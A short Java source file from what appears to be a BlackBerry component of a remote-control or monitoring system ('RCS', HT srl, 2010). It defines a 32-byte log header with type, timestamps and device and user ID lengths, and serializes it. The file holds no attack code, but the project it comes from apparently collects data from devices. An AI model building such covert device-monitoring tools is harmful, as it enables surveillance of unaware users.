/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : LogDescription.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.log;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.utils.Check;

public class LogDescription {
    public int Version;
    public int LogType;
    public int HTimeStamp;
    public int LTimeStamp;

    public int DeviceIdLen;
    public int UserIdLen;
    public int SourceIdLen;
    public int AdditionalData;

    public final int length = 32;

    public byte[] getBytes() {
        byte[] buffer = new byte[length];
        serialize(buffer, 0);
        Check.ensures(buffer.length == length, "Wrong len");
        return buffer;
    }

    public void serialize(byte[] buffer, int offset) {
        DataBuffer databuffer = new DataBuffer(buffer, offset, length, false);
        databuffer.writeInt(Version);
        databuffer.writeInt(LogType);
        databuffer.writeInt(HTimeStamp);
        databuffer.writeInt(LTimeStamp);

        databuffer.writeInt(DeviceIdLen);
        databuffer.writeInt(UserIdLen);
        databuffer.writeInt(SourceIdLen);
        databuffer.writeInt(AdditionalData);

    }
}
